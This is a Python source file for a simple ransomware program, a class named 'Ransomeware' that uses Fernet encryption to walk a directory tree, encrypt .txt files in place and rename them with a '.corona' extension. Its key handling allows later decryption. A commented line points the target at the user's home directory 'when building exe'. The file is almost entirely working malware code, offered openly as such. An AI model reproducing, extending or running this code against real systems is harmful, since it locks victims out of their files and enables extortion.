import os
from cryptography.fernet import Fernet 

class Ransomeware:

    def __init__(self, key=None):
        self.key = key
        self.crypter = None
        self.file_ext_target = [ "txt" ]
        self.ransomware_ext = '.corona'

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def read_key(self, keyfilename):
        with open(keyfilename, 'rb') as f:
            self.key = f.read()
            self.crypter = Fernet(self.key)

    def write_key(self, keyfilename):
        with open(keyfilename, 'wb') as f:
            f.write(self.key)

    def rename(self, file_path, encrypted: bool):
        # /home/username/path/to/file | file.corona
        path_split = list(os.path.split(file_path))
        if not encrypted:
            # filename => filename.corona
            path_split[-1] += self.ransomware_ext
        else:
            # filename.txt.corona => filename.txt
            path_split[-1] = path_split[-1].replace(self.ransomware_ext, '')
        encrypted_file_path = os.path.join(*path_split)
        os.rename(file_path, encrypted_file_path)


    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb+') as f:
            _data = f.read()
            if not encrypted:
                print("data before pre encryption:", _data)
                data = self.crypter.encrypt(_data)
                print("data after post encryption:", data)
            else:
                print("data before pre decryption:", _data)
                data = self.crypter.decrypt(_data)
                print("data after post decryption:", data)
            f.seek(0)
            f.write(data)
            f.truncate()
            f.close()

            if not encrypted: self.rename(file_path, encrypted=False)
            else: self.rename(file_path, encrypted=True)



    def crypt_root(self, root_dir, encrypted=False):
        for root, _, files in os.walk(root_dir):
            for file in files:
                abs_path = os.path.join(root, file)

                if not encrypted:
                    # encrypt the file
                    if abs_path.split('.')[-1] in self.file_ext_target:
                        self.crypt_file(abs_path, encrypted=False)
                else:
                    # decrypt the file
                    if self.ransomware_ext in abs_path:
                        self.crypt_file(abs_path, encrypted=True)

if __name__ == "__main__":
    # sys_root = os.path.expanduser('~')
    local_root = '.'

    # python main.py --action encrypt|decrypt --keyfile "./keyfile"

    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--action', required=True)
    parser.add_argument('--keyfile')

    args = parser.parse_args()
    action = args.action.lower()
    keyfile = args.keyfile

    rware = Ransomeware()

    if action == 'decrypt':
        if keyfile is None:
            print("Please provide keyfile with --keyfile \"./keyfile\"")
        else:
            rware.read_key(keyfile)
            rware.crypt_root(local_root, encrypted=True) # use sys_root when building exe

    elif action == 'encrypt':
        if keyfile:
            rware.read_key(keyfile)
        else:
            rware.generate_key()
        rware.write_key('mykey.key')
        rware.crypt_root(local_root, encrypted=False)


        